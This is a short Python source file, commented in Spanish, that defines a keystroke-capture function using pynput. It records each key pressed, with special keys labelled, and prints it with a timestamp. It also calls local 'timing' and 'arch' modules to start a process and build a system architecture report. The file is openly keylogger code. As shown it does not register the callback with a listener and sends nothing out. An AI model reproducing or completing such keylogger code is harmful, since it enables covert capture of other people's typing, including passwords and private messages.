import pynput
import datetime
import timing
import arch
log = ""
tiempos = timing.tiempos()

#se crea el reporte de la arquitectura
rarch = arch.arch()   

#une los datos que van al txt report
def append_to_log(string):
    global log 
    log = string
    print(log , "     " , str(datetime.datetime.today()))

#captura de teclas
def keylogger(key):
        try:
            otrokey = str(key.char)
        except AttributeError:
            if key == key.space:
                otrokey = " "
            else:
                otrokey= " " + str(key) + " " 
        append_to_log(otrokey)



#iniciando proceso
tiempos.start()
